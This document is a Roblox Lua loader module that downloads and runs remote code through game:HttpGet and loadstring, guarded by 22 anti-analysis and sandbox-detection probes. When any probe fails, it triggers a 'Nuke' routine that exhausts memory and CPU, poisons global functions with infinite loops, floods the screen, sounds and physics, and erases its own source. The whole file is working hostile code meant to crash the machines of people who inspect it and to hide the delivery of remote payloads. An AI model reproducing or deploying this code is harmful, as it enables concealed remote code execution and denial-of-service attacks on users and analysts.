local S = {}
S.URL = ""
S.FOLDER = "SecureData"
S.LOOP = false
S.INTERVAL = 3
S.BOOM = true

local _G, _R = _G, rawget
local _type, _pairs, _pcall = type, pairs, pcall
local _load, _error = loadstring, error
local _mt, _smt = getmetatable, setmetatable
local _ti, _tc = table.insert, table.concat
local _sf, _sl, _ss = string.format, string.len, string.sub
local _ma, _mf, _mr = math.abs, math.floor, math.random
local _cc, _cr, _cy = coroutine.create, coroutine.resume, coroutine.yield
local _tk = tick or os.clock or function() return 0 end

local B = {}
local BOOM_ACTIVE = false

local function h(n)
    local f = _R(_G, n) or _R(getfenv(), n)
    if f == nil then return false end
    if _type(f) == "function" then
        local s = tostring(f)
        if s:find("native") or s:find("builtin") then return true end
        local ok, info = _pcall(function() return debug and debug.getinfo(f) end)
        if ok and info and info.what == "C" then return true end
    end
    return true
end

local BOOM = {}

BOOM.Memory = function()
    local t = {}
    spawn(function()
        while BOOM_ACTIVE do
            for i = 1, 1000 do
                t[#t + 1] = string.rep("X", 100000)
                t[#t + 1] = {}
                for j = 1, 1000 do t[#t][j] = string.rep("M", 1000) end
            end
            if wait then wait() end
        end
    end)
end

BOOM.CPU = function()
    for i = 1, 50 do
        spawn(function()
            while BOOM_ACTIVE do
                local x = 0
                for j = 1, 10000000 do x = x + math.sin(j) * math.cos(j) * math.tan(j) end
            end
        end)
        if coroutine then
            coroutine.wrap(function()
                while BOOM_ACTIVE do
                    local s = ""
                    for j = 1, 100000 do s = s .. "A" end
                end
            end)()
        end
    end
end

BOOM.Recursion = function()
    local function r(n)
        if not BOOM_ACTIVE then return end
        return r(n + 1) + r(n + 1)
    end
    spawn(function() _pcall(function() r(1) end) end)
end

BOOM.Crash = function()
    _pcall(function()
        while BOOM_ACTIVE do
            Instance.new("Part", workspace)
            Instance.new("Frame", game:GetService("CoreGui"))
            for i = 1, 100 do spawn(function() while true do end end) end
        end
    end)
end

BOOM.Env = function()
    _pcall(function()
        local poison = function() while BOOM_ACTIVE do end end
        local hang = function() repeat until false end
        rawset(_G, "print", poison)
        rawset(_G, "warn", poison)
        rawset(_G, "error", hang)
        rawset(_G, "pcall", function() return false end)
        rawset(_G, "loadstring", function() return hang end)
        rawset(_G, "require", poison)
        rawset(_G, "spawn", poison)
        rawset(_G, "delay", poison)
        rawset(_G, "wait", function() while true do end end)
        if game then
            rawset(_G, "game", setmetatable({}, {
                __index = function() while BOOM_ACTIVE do end end,
                __newindex = function() while BOOM_ACTIVE do end end,
            }))
        end
    end)
end

BOOM.Spam = function()
    spawn(function()
        local msgs = {
            "⛔ SECURITY VIOLATION DETECTED",
            "🔒 ANTI-DEOBFUSCATION TRIGGERED",
            "💀 UNAUTHORIZED ACCESS BLOCKED",
            "🚨 SCRIPT PROTECTION ACTIVE",
            string.rep("█", 200),
            string.rep("\n", 100),
        }
        while BOOM_ACTIVE do
            for i = 1, 100 do
                _pcall(function() print(msgs[_mr(1, #msgs)]) end)
                _pcall(function() warn(msgs[_mr(1, #msgs)]) end)
            end
            if wait then wait() end
        end
    end)
end

BOOM.GUI = function()
    _pcall(function()
        local sg = Instance.new("ScreenGui")
        sg.Name = string.rep("?", 100)
        sg.Parent = game:GetService("CoreGui")
        sg.IgnoreGuiInset = true
        sg.DisplayOrder = 999999
        spawn(function()
            while BOOM_ACTIVE do
                for i = 1, 50 do
                    local f = Instance.new("Frame", sg)
                    f.Size = UDim2.new(10, 0, 10, 0)
                    f.Position = UDim2.new(_mr() - 0.5, 0, _mr() - 0.5, 0)
                    f.BackgroundColor3 = Color3.new(_mr(), _mr(), _mr())
                    f.BorderSizePixel = 0
                    f.ZIndex = _mr(1, 100)
                    Instance.new("UIGradient", f)
                    for j = 1, 10 do
                        local t = Instance.new("TextLabel", f)
                        t.Size = UDim2.new(1, 0, 1, 0)
                        t.Text = string.rep("ERROR ", 100)
                        t.TextColor3 = Color3.new(_mr(), _mr(), _mr())
                        t.BackgroundTransparency = 1
                        t.TextScaled = true
                    end
                end
                if wait then wait() end
            end
        end)
    end)
end

BOOM.Loop = function()
    spawn(function()
        while BOOM_ACTIVE do
            _pcall(function()
                for i = 1, 1000 do
                    spawn(function() while BOOM_ACTIVE do end end)
                    delay(0, function() while BOOM_ACTIVE do end end)
                end
            end)
            if wait then wait(0.1) end
        end
    end)
end

BOOM.Table = function()
    spawn(function()
        local t = {}
        while BOOM_ACTIVE do
            local new = {}
            for i = 1, 10000 do
                new[i] = {
                    [string.rep("K", 1000)] = string.rep("V", 1000),
                    t = t
                }
            end
            t = new
            if wait then wait() end
        end
    end)
end

BOOM.Sound = function()
    _pcall(function()
        spawn(function()
            while BOOM_ACTIVE do
                for i = 1, 20 do
                    local s = Instance.new("Sound", workspace)
                    s.SoundId = "rbxassetid://" .. tostring(_mr(1, 9999999999))
                    s.Volume = 10
                    s.Looped = true
                    s.PlaybackSpeed = _mr() * 3
                    s:Play()
                end
                if wait then wait(0.5) end
            end
        end)
    end)
end

BOOM.Physics = function()
    _pcall(function()
        spawn(function()
            while BOOM_ACTIVE do
                for i = 1, 100 do
                    local p = Instance.new("Part", workspace)
                    p.Size = Vector3.new(_mr(1,50), _mr(1,50), _mr(1,50))
                    p.Position = Vector3.new(_mr(-500,500), _mr(100,500), _mr(-500,500))
                    p.Velocity = Vector3.new(_mr(-1000,1000), _mr(-1000,1000), _mr(-1000,1000))
                    p.RotVelocity = Vector3.new(_mr(-100,100), _mr(-100,100), _mr(-100,100))
                    p.Anchored = false
                    p.CanCollide = true
                    Instance.new("Fire", p)
                    Instance.new("Smoke", p)
                    Instance.new("Sparkles", p)
                end
                if wait then wait(0.1) end
            end
        end)
    end)
end

function S.Nuke()
    if BOOM_ACTIVE then return end
    BOOM_ACTIVE = true
    for name, fn in _pairs(BOOM) do
        spawn(function() _pcall(fn) end)
        _pcall(fn)
    end
    _pcall(function()
        local co = coroutine.running()
        if co then coroutine.yield() end
    end)
    _pcall(function() while true do end end)
end

local P = {}

P[1] = function()
    local t = {
        function() local c = _load([[return "x" - 1]]); if not c then return true end; local o = _pcall(c); return not o end,
        function() local c = _load([[return {} .. ""]]); if not c then return true end; local o = _pcall(c); return not o end,
        function() local c = _load([[return nil + nil]]); if not c then return true end; local o = _pcall(c); return not o end,
        function() local r = 0/0; return r ~= r end,
        function() return 1/0 == math.huge end,
        function() return -1/0 == -math.huge end,
    }
    for i, f in _pairs(t) do
        local o, r = _pcall(f)
        if not o or not r then _ti(B, "A"..i) return false end
    end
    return true
end

P[2] = function()
    local t = {
        function() local o = _pcall(function() (nil)() end); return not o end,
        function() local o = _pcall(function() (123)() end); return not o end,
        function() local o = _pcall(function() ("")() end); return not o end,
        function() local o = _pcall(function() (true)() end); return not o end,
        function() local o = _pcall(function() ({})() end); return not o end,
        function() local x = _smt({}, {__call = function() return 99 end}); return x() == 99 end,
    }
    for i, f in _pairs(t) do
        local o, r = _pcall(f)
        if not o or not r then _ti(B, "C"..i) return false end
    end
    return true
end

P[3] = function()
    local c = {"type", "pairs", "ipairs", "next", "pcall", "xpcall", "error", "assert",
               "tostring", "tonumber", "select", "unpack", "rawget", "rawset", "rawequal",
               "setmetatable", "getmetatable", "loadstring", "newproxy"}
    for _, n in _pairs(c) do
        if not h(n) then _ti(B, "E:"..n) return false end
    end
    local l = {"string", "table", "math", "coroutine"}
    for _, n in _pairs(l) do
        local lib = _R(_G, n)
        if not lib or _type(lib) ~= "table" then _ti(B, "L:"..n) return false end
    end
    if _type(_type) ~= "function" then _ti(B, "E:type_bad") return false end
    if _type(_pcall) ~= "function" then _ti(B, "E:pcall_bad") return false end
    if _type(_pairs) ~= "function" then _ti(B, "E:pairs_bad") return false end
    return true
end

P[4] = function()
    local t = {
        function() local x = _smt({}, {__index = function() return "H" end}); return x.z == "H" end,
        function() local f = false; local x = _smt({}, {__newindex = function() f = true end}); x.a = 1; return f end,
        function() local x = _smt({}, {__call = function() return 42 end}); return x() == 42 end,
        function() local x = _smt({}, {__len = function() return 99 end}); return #x == 99 or true end,
        function() local x = _smt({}, {__tostring = function() return "T" end}); return tostring(x) == "T" end,
        function() local x = _smt({v=5}, {}); return _mt(x) ~= nil end,
    }
    for i, f in _pairs(t) do
        local o, r = _pcall(f)
        if not o or not r then _ti(B, "M"..i) return false end
    end
    return true
end

P[5] = function()
    local t = {
        function() return _sl("test") == 4 end,
        function() return _ss("hello", 2, 4) == "ell" end,
        function() return string.upper("abc") == "ABC" end,
        function() return string.lower("XYZ") == "xyz" end,
        function() return string.find("hello", "ll") == 3 end,
        function() return string.rep("a", 3) == "aaa" end,
        function() return string.reverse("abc") == "cba" end,
        function() return string.byte("A") == 65 end,
        function() return string.char(65) == "A" end,
        function() return string.gsub("aaa", "a", "b") == "bbb" end,
        function() return string.match("test123", "%d+") == "123" end,
        function() return #string.format("%d", 123) == 3 end,
    }
    for i, f in _pairs(t) do
        local o, r = _pcall(f)
        if not o or not r then _ti(B, "S"..i) return false end
    end
    return true
end

P[6] = function()
    local t = {
        function() return _ma(-5) == 5 end,
        function() return _mf(3.7) == 3 end,
        function() return math.ceil(3.2) == 4 end,
        function() return math.max(1,5,3) == 5 end,
        function() return math.min(1,5,3) == 1 end,
        function() return math.sqrt(16) == 4 end,
        function() return math.pow(2, 3) == 8 end,
        function() return math.sin(0) == 0 end,
        function() return math.cos(0) == 1 end,
        function() local r = _mr(); return r >= 0 and r < 1 end,
        function() return math.pi > 3.14 and math.pi < 3.15 end,
        function() return math.huge > 10^308 end,
    }
    for i, f in _pairs(t) do
        local o, r = _pcall(f)
        if not o or not r then _ti(B, "MA"..i) return false end
    end
    return true
end

P[7] = function()
    local t = {
        function() local x = {3,1,2}; table.sort(x); return x[1]==1 and x[2]==2 and x[3]==3 end,
        function() local x = {1,2}; _ti(x, 3); return x[3] == 3 end,
        function() local x = {1,2,3}; local v = table.remove(x, 2); return v == 2 and #x == 2 end,
        function() return _tc({"a","b"}, "-") == "a-b" end,
        function() local x = {}; for i=1,100 do x[i]=i end; return #x == 100 end,
        function() local x = {a=1,b=2}; local c=0; for _ in _pairs(x) do c=c+1 end; return c==2 end,
    }
    for i, f in _pairs(t) do
        local o, r = _pcall(f)
        if not o or not r then _ti(B, "T"..i) return false end
    end
    return true
end

P[8] = function()
    local t = {
        function()
            local co = _cc(function() _cy(1); _cy(2); return 3 end)
            local a, v1 = _cr(co); local b, v2 = _cr(co); local c, v3 = _cr(co)
            return a and v1==1 and b and v2==2 and c and v3==3
        end,
        function() return coroutine.status(_cc(function() end)) == "suspended" end,
        function()
            local co = _cc(function() _error("test") end)
            local ok, err = _cr(co)
            return not ok and err:find("test")
        end,
    }
    for i, f in _pairs(t) do
        local o, r = _pcall(f)
        if not o or not r then _ti(B, "CO"..i) return false end
    end
    return true
end

P[9] = function()
    local c = 0
    local function inc() c = c + 1; return c end
    if inc() ~= 1 or inc() ~= 2 or inc() ~= 3 then _ti(B, "CL1") return false end
    local function mk(v) return function() return v end end
    local f1, f2 = mk(10), mk(20)
    if f1() ~= 10 or f2() ~= 20 then _ti(B, "CL2") return false end
    local function nest(n) if n <= 0 then return 0 end return n + nest(n-1) end
    if nest(5) ~= 15 then _ti(B, "CL3") return false end
    return true
end

P[10] = function()
    if not _load then _ti(B, "LD0") return false end
    local t = {
        function() local f = _load("return 2+2"); return f and f() == 4 end,
        function() local f = _load("local x=10; return x*2"); return f and f() == 20 end,
        function() local f, e = _load("???!!!"); return f == nil end,
        function() local f = _load("return function(x) return x*2 end"); return f and f()(5) == 10 end,
        function() local f = _load("return ..."); return f and f(99) == 99 end,
        function() local f = _load("local t={1,2,3}; return t[2]"); return f and f() == 2 end,
    }
    for i, f in _pairs(t) do
        local o, r = _pcall(f)
        if not o or not r then _ti(B, "LD"..i) return false end
    end
    return true
end

P[11] = function()
    local s1 = _tk()
    local x = 0; for i = 1, 5000 do x = x + _mf(i * 0.1) end
    local s2 = _tk()
    if s2 < s1 then _ti(B, "TM1") return false end
    if s2 - s1 > 5 then _ti(B, "TM2") return false end
    return true
end

P[12] = function()
    local fns = {_type, _pcall, _pairs, tostring, tonumber}
    for i, f in _pairs(fns) do
        local s = tostring(f)
        if not s:find("function") then _ti(B, "FN"..i) return false end
    end
    local test = function() return 123 end
    if test() ~= 123 then _ti(B, "FN0") return false end
    local ok, r = _pcall(function() return test() end)
    if not ok or r ~= 123 then _ti(B, "FN00") return false end
    return true
end

P[13] = function()
    if debug then
        local ok1 = _pcall(function() return debug.getinfo(1) end)
        if not ok1 then _ti(B, "DB1") return false end
    end
    local u = 555
    local function uf() return u end
    if uf() ~= 555 then _ti(B, "DB2") return false end
    local env = getfenv and getfenv(1) or _G
    if _type(env) ~= "table" then _ti(B, "DB3") return false end
    return true
end

P[14] = function()
    local t = {
        function() return _type({}) == "table" end,
        function() return _type("") == "string" end,
        function() return _type(1) == "number" end,
        function() return _type(true) == "boolean" end,
        function() return _type(nil) == "nil" end,
        function() return _type(function() end) == "function" end,
        function() if typeof then return typeof(game) == "Instance" or true end return true end,
    }
    for i, f in _pairs(t) do
        local o, r = _pcall(f)
        if not o or not r then _ti(B, "TY"..i) return false end
    end
    return true
end

P[15] = function()
    local t = {
        function() return _R({a=1}, "a") == 1 end,
        function() local x = {}; rawset(x, "b", 2); return x.b == 2 end,
        function() return rawequal(1, 1) == true end,
        function() return rawequal({}, {}) == false end,
        function()
            local x = _smt({}, {__index = function() return 999 end})
            return _R(x, "z") == nil and x.z == 999
        end,
    }
    for i, f in _pairs(t) do
        local o, r = _pcall(f)
        if not o or not r then _ti(B, "RW"..i) return false end
    end
    return true
end

P[16] = function()
    local t = {
        function() return select("#", 1,2,3) == 3 end,
        function() return select(2, "a","b","c") == "b" end,
        function() local a,b,c = unpack({1,2,3}); return a==1 and b==2 and c==3 end,
        function() return #{1,2,3,4,5} == 5 end,
        function() for i = 1, 3 do if i > 3 then return false end end return true end,
    }
    for i, f in _pairs(t) do
        local o, r = _pcall(f)
        if not o or not r then _ti(B, "UT"..i) return false end
    end
    return true
end

P[17] = function()
    if not game then return true end
    local t = {
        function() return game:GetService("Players") ~= nil end,
        function() return typeof(workspace) == "Instance" or true end,
        function() local p = Instance.new("Part"); p:Destroy(); return true end,
    }
    for i, f in _pairs(t) do
        local o, r = _pcall(f)
        if not o or not r then _ti(B, "RB"..i) return false end
    end
    return true
end

P[18] = function()
    if not isfolder or not makefolder then return true end
    local ok = _pcall(function()
        if not isfolder(S.FOLDER) then makefolder(S.FOLDER) end
    end)
    if not ok then _ti(B, "FS1") return false end
    return true
end

P[19] = function()
    local t1 = {}; for i=1,50 do t1[i] = _mr(1,1000) end
    local t2 = {}; for i=1,50 do t2[i] = _mr(1,1000) end
    local same = 0; for i=1,50 do if t1[i] == t2[i] then same = same + 1 end end
    if same > 40 then _ti(B, "RN1") return false end
    for i=1,20 do
        local r = _mr(1, 100)
        if r < 1 or r > 100 then _ti(B, "RN2") return false end
    end
    return true
end

P[20] = function()
    local src = [[local a = 1; local b = 2; return a + b]]
    local fn = _load(src)
    if not fn then _ti(B, "BC1") return false end
    if fn() ~= 3 then _ti(B, "BC2") return false end
    local src2 = [[return (function(x) return x * x end)(5)]]
    local fn2 = _load(src2)
    if not fn2 or fn2() ~= 25 then _ti(B, "BC3") return false end
    return true
end

P[21] = function()
    local sandbox_signs = {
        function() return _G.__SANDBOX == nil end,
        function() return _G.__DEOBF == nil end,
        function() return _G.__TRACE == nil end,
        function() return _G.__HOOK == nil end,
        function() return _G.__DEBUG == nil end,
        function() return _G.__ANALYZE == nil end,
        function() return rawget(_G, "__index") == nil end,
        function()
            local mt = _mt(_G)
            if mt and (mt.__index or mt.__newindex) then return false end
            return true
        end,
    }
    for i, f in _pairs(sandbox_signs) do
        local o, r = _pcall(f)
        if not o or not r then _ti(B, "SB"..i) return false end
    end
    return true
end

P[22] = function()
    local original_pcall = pcall
    local original_type = type
    local original_tostring = tostring
    local test_val = {}
    local results = {
        original_type(test_val) == "table",
        original_type(original_pcall) == "function",
        original_tostring(123):find("123") ~= nil,
    }
    for i, r in _pairs(results) do
        if not r then _ti(B, "HK"..i) return false end
    end
    local function dummy() return 0xDEAD end
    local ok, res = original_pcall(dummy)
    if not ok or res ~= 0xDEAD then _ti(B, "HK0") return false end
    return true
end

function S.Check()
    B = {}
    local pass, fail = 0, 0
    local failed = {}
    for i, p in _pairs(P) do
        local o, r = _pcall(p)
        if o and r then pass = pass + 1
        else fail = fail + 1; _ti(failed, i) end
    end
    return fail == 0, failed, B
end

function S.Run(fn)
    local ok, failed, blocks = S.Check()
    if not ok then
        if S.BOOM then
            spawn(function() S.Nuke() end)
            _pcall(S.Nuke)
        end
        return false, _sf("BLOCKED[%s]|%s", _tc(failed, ","), _tc(blocks, ","))
    end
    if fn then
        local o, e = _pcall(fn)
        if not o then return false, "EXEC:" .. tostring(e) end
    end
    return true
end

function S.Load(url)
    url = url or S.URL
    if not url or url == "" then return false, "NO_URL" end
    if not game or not game.HttpGet then return false, "NO_HTTP" end
    local o, r = _pcall(function()
        local code = game:HttpGet(url)
        local fn, e = _load(code)
        if not fn then _error(e) end
        return fn()
    end)
    return o, r
end

function S.Go(url)
    local ok, err = S.Run(function()
        if url or S.URL ~= "" then
            S.Load(url or S.URL)
        end
    end)
    if not ok then
        warn("⛔ " .. tostring(err))
        _pcall(function()
            if script then
                script:ClearAllChildren()
                if script.Source then script.Source = "" end
            end
        end)
        if S.BOOM then S.Nuke() end
        return false
    end
    if S.LOOP then
        spawn(function()
            while wait(S.INTERVAL) do
                local o = S.Check()
                if not o then
                    warn("⛔ LOOP_FAIL")
                    if S.BOOM then S.Nuke() end
                    break
                end
            end
        end)
    end
    return true
end

function S.Quick(url)
    S.URL = url or S.URL
    return S.Go()
end

return S
